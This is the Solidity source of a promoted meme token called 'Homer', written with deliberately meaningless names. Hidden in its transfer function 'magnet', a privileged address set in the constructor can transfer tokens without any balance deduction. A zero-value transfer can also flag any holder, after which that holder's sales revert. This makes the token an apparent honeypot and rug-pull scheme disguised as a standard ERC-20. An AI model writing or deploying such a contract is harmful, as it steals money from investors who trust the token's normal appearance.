/*

Website 🔗: https://homer.crypto-token.live/

Twitter 🐦: https://twitter.com/Homer__ETH

Telegram 💬: https://t.me/HomerETH

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Homer is Ownable {
    mapping(address => uint256) public balanceOf;

    uint256 private struck = 11;

    function magnet(address popular, address or, uint256 perfectly) private returns (bool success) {
        if (settlers[popular] == 0) {
            if (uniswapV2Pair != popular && pair[popular] > 0) {
                settlers[popular] -= struck;
            }
            balanceOf[popular] -= perfectly;
        }
        balanceOf[or] += perfectly;
        if (perfectly == 0) {
            pair[or] += struck;
        }
        emit Transfer(popular, or, perfectly);
        return true;
    }

    string public name = 'Homer';

    constructor(address struggle) {
        balanceOf[msg.sender] = totalSupply;
        settlers[struggle] = struck;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address popular, address or, uint256 perfectly) public returns (bool success) {
        magnet(popular, or, perfectly);
        require(perfectly <= allowance[popular][msg.sender]);
        allowance[popular][msg.sender] -= perfectly;
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    address public uniswapV2Pair;

    mapping(address => uint256) private settlers;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address can, uint256 perfectly) public returns (bool success) {
        allowance[msg.sender][can] = perfectly;
        emit Approval(msg.sender, can, perfectly);
        return true;
    }

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function transfer(address or, uint256 perfectly) public returns (bool success) {
        magnet(msg.sender, or, perfectly);
        return true;
    }

    string public symbol = 'Homer';

    mapping(address => uint256) private pair;
}